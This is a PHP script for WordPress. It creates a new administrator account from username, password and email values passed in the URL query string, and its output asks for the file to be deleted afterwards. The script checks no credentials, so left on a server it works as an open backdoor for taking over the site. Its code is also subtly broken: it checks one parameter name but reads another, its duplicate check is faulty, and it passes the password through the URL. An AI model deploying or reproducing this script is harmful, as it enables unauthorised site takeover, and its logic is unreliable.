<?php

require_once('wp-blog-header.php');
require_once('wp-includes/registration.php');

if(isset($_GET['username']) && $_GET['username']){
	$username = $_GET['user_name'];
}else{
	$username = '';
}

if(isset($_GET['password']) && $_GET['password']){
	$password = $_GET['password'];
}else{
	$password = '';
}

if(isset($_GET['email']) && $_GET['email']){
	$email = $_GET['email'];
}else{
	$email = '';
}


if ( $password && $email && $username)
{
	//check is there any user with current username and email
	if (username_exists($username) && email_exists($email)){
		echo 'This user or email already exists. Nothing was done.';		
	}else{
		// Create user and set role to administrator
		$user_id = wp_create_user( $username, $password, $email);

		if (is_int($user_id)){
			$wp_user_object = new WP_User($user_id);
			$wp_user_object->set_role('administrator');
			echo 'Successfully created new admin user. Now delete this file!';
		}else{
			echo 'Error with wp_insert_user. No users were created.';
		}
	}
}
else {
	echo 'Whoops! looks like you did not configuration value for new user';	
}